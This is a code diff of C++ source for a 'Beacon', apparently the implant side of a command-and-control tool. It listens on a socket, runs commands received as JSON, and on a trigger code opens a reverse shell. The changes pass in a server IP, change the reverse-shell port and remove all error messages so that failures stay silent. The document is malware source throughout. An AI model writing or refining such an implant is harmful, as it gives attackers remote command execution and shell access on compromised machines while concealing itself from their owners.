@@ -16,11 +16,12 @@ using json = nlohmann::json;
 
 Cmdline cmdline("","");
 
-Beacon::Beacon(int bid, int bport, const char *b_attached_to)
+Beacon::Beacon(int bid, int bport, const char *b_attached_to, const char *serv_ip_addr)
 {
     id = bid;
     port = bport;
     attached_to = b_attached_to;
+    serv_ip = serv_ip_addr;
 }
 
 int stop_accept = 0;
@@ -33,7 +34,6 @@ void Beacon::await_update()
     int addrlen = sizeof(address);
     if ((beacon_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     {
-        std::cerr << "Failed to initialise socket\n";
         return;
     }
 
@@ -41,8 +41,7 @@ void Beacon::await_update()
                    SO_REUSEADDR | SO_REUSEPORT, &opt,
                    sizeof(opt)))
     {
-        perror("setsockopt");
-        exit(EXIT_FAILURE);
+        return;
     }
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = inet_addr(attached_to);
@@ -51,13 +50,11 @@ void Beacon::await_update()
     if (bind(beacon_fd, (struct sockaddr *)&address,
              sizeof(address)) < 0)
     {
-        std::cerr << "Unable to bind to address " << attached_to << std::endl;
         return;
     }
 
     if (listen(beacon_fd, 3) < 0)
     {
-        std::cerr << "listen error\n";
         return;
     }
 
@@ -65,14 +62,14 @@ void Beacon::await_update()
     while (true){
         char buf[1024];
         if (stop_accept == 1){
-            int connect_err = revshell(get_port());
+            int connect_err = revshell(rport);
             stop_accept = 0;
             continue;
         }
         if ((new_socket = accept(beacon_fd, (struct sockaddr *)&address,
                                 (socklen_t *)&addrlen)) < 0)
         {
-            std::cerr << "Accept failure\n";
+            continue;
         }
         valread = read(new_socket, buf, 1024);
         std::string b = std::string{buf}.substr(0,valread);
@@ -106,7 +103,8 @@ std::string Beacon::respond(std::string buf){
     /// COMMAND LINE EXECUTION GOES HERE ///
     std::string cmd = update["cmd"];
 
-    auto [result, op] = cmdline.accept(cmd);
+    cmdline.accept(cmd, false);
+    int result = cmdline.get_exit_code();
     switch(result){
         case 99:
             stop_accept = 1;
@@ -144,11 +142,7 @@ std::string Beacon::set_update(int status, std::string cout, bool alive, bool pe
     return k;
 }
 
-const char* get_ip_addr(){
-    return beacon_ip_addr;
-}
-
-Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);
+Beacon beacon(beacon_id, beacon_port, beacon_ip_addr, serv_ip_addr);
 
 int main()
 {
